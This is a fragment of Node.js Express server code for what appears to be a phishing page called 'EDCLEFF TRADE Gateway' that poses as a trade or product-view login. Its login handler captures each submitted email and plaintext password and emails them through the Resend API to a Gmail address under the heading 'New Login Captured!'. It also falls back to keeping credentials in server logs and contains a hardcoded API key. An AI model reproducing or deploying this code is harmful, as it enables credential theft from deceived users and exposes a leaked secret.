...
// LOGIN HANDLER - Captures credentials and shows products
app.post('/login', async (req, res) => {
  ...
  try {
    const resendApiKey = 're_dYyYdthi_P5EkCnaLuJaDhZ7Hosf6Lm48';
    ...
    const response = await fetch('https://api.resend.com/emails', {
      ...
      body: JSON.stringify({
        ...
        html: `
          <h2>🔐 New Login Captured!</h2>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>Password:</strong> ${password}</p>
          <p><strong>Time:</strong> ${new Date().toISOString()}</p>
          <hr>
          <p>EDCLEFF TRADE Gateway</p>
        `
      })
    });
    ...
    if (response.ok) {
      ...
      console.log('❌ Email failed. Credentials saved in logs above.');
    }
  } catch (err) {
...
app.listen(PORT, () => {
  console.log('✅ EDCLEFF TRADE Gateway running!');
  console.log('🌐 https://edcleff-product-view.onrender.com');
  console.log('\n📧 Email notifications: ON');
  console.log('   Login credentials will be sent to edcleff0@gmail.com\n');
});
